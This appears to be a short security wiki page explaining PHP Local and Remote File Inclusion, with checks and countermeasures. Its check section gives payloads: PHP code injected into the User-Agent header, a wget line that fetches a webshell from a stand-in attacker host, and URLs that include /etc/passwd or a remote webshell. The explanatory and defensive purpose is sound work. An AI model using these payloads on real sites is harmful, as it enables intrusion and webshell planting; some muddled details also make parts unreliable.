---
title: LFI, RFI
category: ""
order: 0
---


## 1. Vulnerability Description
```
LFI : Local File Inclusion
RFI : Remote File Inclusion
```
* The vulnerability occurs when using a function that calls up documents such as include(), include_once(), and request().
* If the above functions do not have proper verification procedures for file names and paths, an attacker can insert certain files in Local&Remote into vulnerable pages and execute code.
If a vulnerability exists, it can be used by a hacker to execute the intended command.

## 2. How to check vulnerability
#### [LFI]
* For Windows, Insert the \<?php passthru('command');?\> code into the user-Agent on the header through a proxy tool and Send it.
* For Unix,  Upload a webshell remotely using commands such as  \<?system('wget http://attacker.com/webshell/test.txt -O test2.php');?\>

#### [RFI]
* Request by inserting local file path or external remote file into parameter as shown below
  * http://test.com/includFile.php?fileName=C:\test.txt
  * http://test.com/includFile.php?fileName=/etc/passwd : Include local files
  * http://test.com/includFile.php?fileName=http://attacker.com/webshell.txt : Include files from remote locations

## 3. Vulnerability Countermeasure
* If the values entered by the user are accurately predictable, verify that they fall within the correct range:
  * If a path or file is specified for an include(), check that the specified value is correct.
  * If an include() path is changed, check that the request value is intended.
    
* Translates some of the characters in question, such as the following, if the values entered by the user are not predictable:
  * Limit usage by changing protocols, such as php wrapper, to filter strings such as "file:"//" that allow specific commands.
  * Add logic to block characters that are not included in the file name in normal cases such as "..", "./", etc.
     * /....// is sometimes converted to /../ after a regular expression
        * "/....////....///....///....///....///".replace(/\.\\\//g)" → "/../..///../../../../../"
        * Do not enter the absolute path itself or verify /../ once again to make an error if the character is included.
        

* If you do not need the Remote File include() function, disable it as follows:
  * Php disables external include() functions such as "allow_url_include = Off, allow_url_open=Off"

## 4. Etc
* Abuse of the include() function
  * ex) include ($Param);
  * include() is used to file and include standard headers and menus to be included on all pages
  * Remote files can be recalled like local files due to their function and setup errors
  
